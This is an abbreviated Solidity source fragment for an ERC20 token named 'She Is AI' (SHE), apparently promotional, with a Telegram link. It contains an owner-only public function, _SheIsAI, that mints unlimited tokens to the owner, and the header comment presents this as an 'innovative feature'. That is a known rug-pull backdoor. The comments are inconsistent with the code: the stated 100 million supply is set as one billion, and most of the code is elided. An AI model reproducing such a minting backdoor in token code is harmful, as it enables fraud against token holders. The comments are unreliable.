...
//
// $SheIsAI proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ShelsAI
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SheIsAI(uint256 amount) public onlyOwner {
 _SheIsAI(msg.sender, amount);
    }
    ...
    function _SheIsAI(address account, uint256 amount) internal virtual {
...
contract $SheIsAI is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("She Is AI", "SHE") {
     _SheIsAI(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}